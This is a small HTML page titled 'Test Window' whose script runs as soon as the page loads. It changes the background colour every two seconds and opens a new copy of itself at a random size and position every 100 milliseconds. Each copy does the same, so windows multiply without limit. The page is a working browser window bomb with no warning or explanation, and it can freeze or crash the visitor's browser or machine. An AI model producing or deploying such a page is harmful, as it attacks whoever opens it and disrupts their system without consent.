<!DOCTYPE html>
<html>
<head>
  <title>Test Window</title>
  <script>
    const colors = [
        "Red", "Green", "Blue", "Yellow", "Cyan", "Magenta", "Orange", "Purple",
        "Pink", "Brown", "Black", "White", "Gray", "Silver", "Gold", "Beige",
        "Aqua", "Azure", "Coral", "Crimson", "DarkBlue", "DarkCyan", "DarkGoldenRod", "DarkGreen",
        "DarkMagenta", "DarkOliveGreen", "DarkOrange", "DarkOrchid", "DarkRed", "DarkSalmon", "DarkSeaGreen", "DarkSlateBlue",
        "DeepPink", "DeepSkyBlue", "DodgerBlue", "FireBrick", "ForestGreen", "Fuchsia", "Gainsboro", "GhostWhite",
        "HotPink", "IndianRed", "Indigo", "Ivory", "Khaki", "Lavender", "LawnGreen", "LemonChiffon",
        "LightBlue", "LightCoral", "LightCyan", "LightGray", "LightGreen", "LightPink", "LightSalmon", "LightSkyBlue",
        "Lime", "Maroon", "MediumAquaMarine", "MediumOrchid", "MediumPurple", "MidnightBlue", "Navy", "Olive"
      ];
      
          let colorIndex = 0;
      
          function changeColor() {
      document.body.style.backgroundColor = colors[colorIndex % colors.length];
      colorIndex++;
          }
      
          function getRandomInt(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
          }
      
          function openNewWindow() {
      const width = getRandomInt(200, 600);
      const height = getRandomInt(200, 600);
      const left = getRandomInt(0, screen.availWidth - width);
      const top = getRandomInt(0, screen.availHeight - height);
      
      const features = `width=${width},height=${height},left=${left},top=${top}`;
      window.open(window.location.href, "_blank", features);
          }
      
          window.onload = function () {

      setInterval(changeColor, 2000);
      setInterval(openNewWindow, 100);

          };
  </script>
</head>
<body>
  <h1 style="color:white; text-align:center;"></h1>
</body>
</html>
